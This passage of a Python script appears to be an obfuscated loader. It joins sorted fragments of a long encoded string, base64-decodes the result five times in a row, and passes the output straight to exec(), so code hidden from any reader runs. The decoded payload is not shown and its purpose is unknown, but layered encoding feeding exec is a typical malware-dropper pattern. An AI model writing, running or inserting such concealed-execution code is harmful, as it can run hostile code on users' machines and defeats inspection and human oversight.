WFrMVhTbGhUV0docVRXcFdiMVpxUmtka1ZtUkhXak5rYUZaWVVsTlpha3ByVTJ4RmQxSnROVlJXVlRWRFYycENjMUpHUmxoYVJYQlNUVVZhVFZVeFZrOVJiRzkzWWtWb1YyRnNTbUZVVjNoaFRURndSbFJyVGxOTmExcFpXbFZrTkZaWFNsVmhNMlJXWWxSQk1WUldaRXRrUmxaeVYyMXdhV0V6UVhsWFZFcDNaR3hOZDJKRlVsSldNbEpMVlZSQ1IySnNUbFpVYTA1clRXczFNRmxyYUZkaE1VVjVZVWhTVkZkR2NFVlhiVEUwVkZaV1dGbDZTbGhpUlRWb1ZHMTBlbU50VW5GWmVrNXNWakJWZUZrd1pFZFRWVFZXWlVSR1RtRXllRVZYYTFKcllVWlplRk50TVZoaVZFWjZXWHBHZDFZd09WbGFSbkJZVW10d01sZHRlRTloYkhBMlZtc3hhRlpVVVhoWFZsSkxWMnMxVjJORVZtbE5SM2gzV1ZSQ01GTnNSWGRTYlRWVVZsZFNXRlJyV25KbFZscDFXa2QwVWsxRmNFaFhiRlpyVkRKS1NGUnJiRlppYTBwd1ZGZHdVMkpzWkZkaFJUVmhUVmhDVmxscVFqQlRiRVYzVW0wMVZGWlZOVU5YYWtKelVrWkdkVnBIY0dsV00yZDRWMnRXVDJJeVNsWmlSRVpVVFd4S2VGVlVRbE5rUjBsM1pVaEdhbE5GV2pKYVZ6QTFUV3MxU0ZkdVZtcFdWM2Q1V1d0a2JrMHlUblZSYms1VVlsaE5lVlV4Vm05TlIwcElWMnhTVkZkRlNrVlhhazVEWkRGa2RHSkZUbUZpUjJRMVZHeGtiMkZXV1hoWGJURllVMGQ0UTFReFdrTldSa1pZWWtac1RsWkhkM2RXTVZwcll6SlNWMW96YUZCU01uaFJWMnBKTldKc1RsWlVhMHBoVFdzMVNsVXlOVU5oVjBwelVtNWFWRmRHV205V01qVlRWVVpaZDJKSVZsZGxiRnAzVmtjeGQxZHJNWEppU0VKb1RVaFNTMVZVUWtkaWJFNVdZVVZPYkZZd1dsbFViRkpEVkVaRmQyVklXbXBoYlZKV1dXeGplRk5yTkhwWGFrcFVZbXR3TUZreU1VZFdWMHBZWWtkc2FXSnJTblpVYTAwMVkyMVNWbUpJVm1oTk1WcE9XVEl3ZUdSR2JITlZiazVvVmxjNU5sbHJaRzVOTWs1MFpVaEtUMUpXV2paVWJHUkhZVVpHTmxadVpHeFdWemg0VmpGV1QxWkZOVmRoTTJ4WFpXeGFiMVpVUm1wTlZsSkpZa2MxVDFaR2JEVlZNbkJYWVVkU1ZrMUVSazlXTUZwVVZHeGtSbU5yT1VWWGEzQmhWa1ZGZUZsdWNHRmpNRFZYWVROS2FHRnNXalJVVjNCcVRWZE9XRkpyVWs5V1dHaDNWa2R3WVZSV1ZYbFhWRXBWVW1zMWVGVXhaSE5qYkUxM1lrVlNVbFl5VWt0VmFrSjNZakZ3UmxwRk9XbE5WMlEyVmpJeE5HRnRTbGhsU0ZKaFZteHJNVlJWWkVkVFZrNTBaVWRHVjJGdGVIcFhWM1JyVmpKU1IyTkdhRTlXUlVweFdsWmthMlF4UlhsWmVteFJWVlF3T1E9PQ==')]

parts_sorted = [p[1] for p in sorted(parts, key=lambda x: x[0])]
s = ''.join(parts_sorted)

def multi_base64_decode(s, times=5):
    for _ in range(times):
        s = base64.b64decode(s.encode()).decode()
    return s

decoded_code = multi_base64_decode(s, 5)

exec(decoded_code)
